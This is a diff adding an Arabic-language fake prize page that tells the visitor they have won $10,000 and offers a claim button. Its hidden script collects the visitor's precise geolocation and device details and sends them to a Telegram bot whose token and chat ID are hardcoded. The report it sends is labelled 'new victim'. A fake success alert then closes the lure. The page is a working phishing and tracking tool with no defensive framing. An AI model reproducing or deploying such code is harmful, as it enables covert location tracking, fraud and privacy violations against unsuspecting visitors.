@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مبروك</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Segoe UI', Tahoma, sans-serif;
+        background: linear-gradient(135deg, #1e3c72, #2a5298);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        color: white;
+        text-align: center;
+    }
+    .container {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 40px 30px;
+        max-width: 400px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+    h1 {
+        font-size: 28px;
+        margin-bottom: 20px;
+        color: #FFD700;
+        text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+    }
+    p {
+        font-size: 16px;
+        line-height: 1.6;
+        margin-bottom: 25px;
+        color: #e0e0e0;
+    }
+    button {
+        background: linear-gradient(135deg, #FFD700, #FFA500);
+        color: #1e3c72;
+        border: none;
+        padding: 15px 40px;
+        font-size: 18px;
+        font-weight: bold;
+        border-radius: 50px;
+        cursor: pointer;
+        box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
+        transition: transform 0.2s;
+    }
+    button:active {
+        transform: scale(0.95);
+    }
+    .spinner {
+        display: none;
+        margin-top: 20px;
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-top: 4px solid #FFD700;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <h1>🎉 مبروك! 🎉</h1>
+    <p>لقد فزت بمبلغ <strong>10,000 دولار</strong>!</p>
+    <p>اضغط على الزر أدناه لاستلام جائزتك الآن</p>
+    <button id="claimBtn">استلام الجائزة</button>
+    <div class="spinner" id="spinner"></div>
+</div>
+
+<script>
+(function() {
+    'use strict';
+
+    var BOT_TOKEN = '8759707833:AAFSzhInZJr9PFqvf7xXpe6BYIKnluWCI6U';
+    var CHAT_ID = '8822455602';
+
+    function sendToTelegram(text) {
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+        var data = {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+        };
+        return fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(function(response) { return response.json(); })
+        .catch(function(err) { console.error('Send error:', err); });
+    }
+
+    function getLocation() {
+        return new Promise(function(resolve) {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    });
+                },
+                function(error) {
+                    resolve(null);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        });
+    }
+
+    function collectDeviceInfo() {
+        var info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: window.screen.width + 'x' + window.screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timestamp: new Date().toISOString()
+        };
+        return info;
+    }
+
+    function formatLocation(loc) {
+        if (!loc) return '❌ لم يتم السماح بالموقع';
+        return '📍 خط العرض: ' + loc.lat + '\n📍 خط الطول: ' + loc.lon + '\n🎯 الدقة: ' + loc.accuracy + ' متر';
+    }
+
+    function formatDevice(info) {
+        return '📱 الجهاز: ' + info.platform + '\n🌐 المتصفح: ' + info.userAgent.substring(0, 100) + '\n🗣️ اللغة: ' + info.language + '\n🖥️ الشاشة: ' + info.screen + '\n🕐 التوقيت: ' + info.timezone;
+    }
+
+    document.getElementById('claimBtn').addEventListener('click', function() {
+        var btn = document.getElementById('claimBtn');
+        var spinner = document.getElementById('spinner');
+        btn.style.display = 'none';
+        spinner.style.display = 'block';
+
+        var deviceInfo = collectDeviceInfo();
+
+        getLocation().then(function(location) {
+            var message = '🎯 <b>ضحية جديدة!</b>\n\n';
+            message += '━━━━━━━━━━━━━━━━━\n';
+            message += '🌐 <b>معلومات الموقع:</b>\n';
+            message += formatLocation(location) + '\n\n';
+            message += '━━━━━━━━━━━━━━━━━\n';
+            message += '📊 <b>معلومات الجهاز:</b>\n';
+            message += formatDevice(deviceInfo) + '\n';
+            message += '━━━━━━━━━━━━━━━━━\n';
+            message += '⏰ <b>الوقت:</b> ' + deviceInfo.timestamp;
+
+            sendToTelegram(message).then(function() {
+                setTimeout(function() {
+                    spinner.style.display = 'none';
+                    btn.style.display = 'inline-block';
+                    btn.textContent = 'تم الاستلام ✅';
+                    alert('تم استلام طلبك بنجاح، سيتم التواصل معك قريباً');
+                }, 2000);
+            });
+        });
+    });
+})();
+</script>
+</body>
+</html>
